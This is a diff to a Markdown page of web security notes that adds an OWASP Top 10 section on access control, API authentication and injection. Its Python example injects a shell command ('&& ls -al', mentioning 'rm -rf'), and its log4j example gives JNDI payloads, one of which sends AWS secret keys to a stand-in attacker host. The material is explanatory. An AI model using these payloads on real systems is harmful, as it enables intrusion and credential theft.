@@ -83,22 +83,70 @@ You can use your existing website or **test websites** to perform security testi
 
 These types of attempts can only be effective if the attacker is able to exploit an existing vulnerability, like a non secure API, SQL injection or gaining access to credentials.
 
-## API Authentication Methods
+## Web Application Security Risks
 
-* Protect APIs from unauthorized access with authentication
-* [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - may not be the most secure
-* Mutual TLS
-* HTTP Basic authentication
-* API Specific authentication
-  * API Key - shared secret
-  * JSON Web Token (JWT)
+The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) provides list of the 10 Most Critical Web Application Security Risks
+
+* Broken Access Control can result in information disclosure, modification or destruction of all data.
+* Preventing Identification and authentication failures, require protecting APIs from unauthorized access with authentication. Some of the techniques used for protecting REST APIs are:
+
+  * [IP address-based ACLs](https://joelgsamuel.medium.com/ip-address-access-control-lists-are-not-as-great-as-you-think-they-are-4176b7d68f20) - may not be the most secure
+  * Certificate based Mutual TLS
+  * HTTP Basic authentication
+  * API Specific authentication
+    * API Key - shared secret
+    * JSON Web Token (JWT)
+
+* Injection includes SQL injection, Cross-Site Scripting
+  * Untrusted data, without input sanitization is sent to the code interpreter by an attacker. There are serious security implications if any part of the string that a user passes can not be fully trusted.
+  * Use **context aware escaping** - ensure that user input is treated as literal text as opposed to something that is executable code
+
+    ```python
+    import os
+    import subprocess
+
+    # allowing executable code, results in executing the command 'ls -al' - information disclosure
+    # this can have serious implications if someone were to pass 'rm -rf' - data destruction
+    e ='echo'
+    input = 'hello world && ls -al'
+    os.system(f"{e} {input})" 
+    
+    # output
+    hello world
+    total 84
+    drwxr-xr-x 9 azureuser azureuser  4096 Oct 11 12:00 .
+    drwxr-xr-x 3 root      root       4096 Oct  6 12:57 ..
+    
+    # ensuring the inputs are properly escaped
+    subprocess.call([e,input])
+    
+    # output
+    hello world && ls -al
+    0
+    ```
+
+  * Injection can also result in **Remote code execution (RCE)** attacks e.g. [log4j vulnerability](https://www.youtube.com/watch?v=uyq8yxWO1ls&ab_channel=JavaBrains). Log injection is relatively harmless but combining it with ability to run remote code can be problematic.
+  
+    ```java
+    final Logger logger = LogManager.getLogger(...);
+    logger.error("Error message: {}", error.message());
+
+    // Search page log
+    logger.info("User {} searched for {}", user.getId(), searchTextInput);
+
+    // if attacker sets up a remote JNDI server with malicious code and passes that as the search input,
+    // it will result in the your affected application using log4j running this remote malicious code
+    searchTextInput = "$jndi:ldap://my-evil-ldap/maliciousobject}"
+
+    // attacker can also lookup application environment variables and send them over to the remote JNDI server
+    searchTextInput = "$jndi:ldap://evil.attacker:1234/${env:AWS_ACCESS_KEY_ID}/${env:AWS_SECRET_ACCESS_KEY}}"
+    ```
 
 ## Resources
 
-* [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) provides list of the 10 Most Critical Web Application Security Risks
 * [OWASP Dependency Check](https://www.owasp.org/index.php/OWASP_Dependency_Check) is a utility that identifies project dependencies and checks if there are any known, publicly disclosed, vulnerabilities
 * API security - https://docs.oracle.com/middleware/1212/owsm/OWSMC/owsm-security-concepts.htm. Although specific to SOAP based web services but the concepts listed in the docs are still relevant to API security
 * [Observatory](https://observatory.mozilla.org/) from mozilla allows free basic website scanning for security flaws
 * National Vulnerability Database - https://nvd.nist.gov/
 * [Application Security Verification Standard](https://www.owasp.org/index.php/Category:OWASP_Application_Security_Verification_Standard_Project) provides a basis for designing, building, and testing technical application security controls
-* CIS Security Benachmarks - https://www.cisecurity.org/cis-benchmarks/
+* CIS Security Benchmarks - https://www.cisecurity.org/cis-benchmarks/
